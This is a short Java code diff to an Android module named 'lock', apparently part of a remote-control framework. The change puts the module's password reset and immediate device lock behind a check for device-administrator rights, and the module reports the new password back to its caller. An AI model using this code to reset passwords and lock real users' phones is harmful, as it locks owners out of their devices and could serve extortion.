@@ -35,17 +35,22 @@ public class lock extends triangulumModule {
 
         ///Note: uncomment the following line for hardcoded newPass
         //newPass="asdf";
-
-        manager.resetPassword(newPass, 0);
-        manager.lockNow();
+        String txt;
+        if (manager.isAdminActive(devAdm)){
+            manager.resetPassword(newPass, 0);
+            manager.lockNow();
 
 /*        KeyguardManager mgr = (KeyguardManager)context.getSystemService(context.KEYGUARD_SERVICE);
         KeyguardManager.KeyguardLock lock = mgr.newKeyguardLock(Context.KEYGUARD_SERVICE);
         lock.disableKeyguard();
         lock.reenableKeyguard();*/
 
-        String txt = "Device Locked: "+newPass;
-		return txt;
+        txt = "Device Locked: "+newPass;
+        } else {
+            txt = "no admin rights:(";
+        }
+
+        return txt;
 
 	}
 }
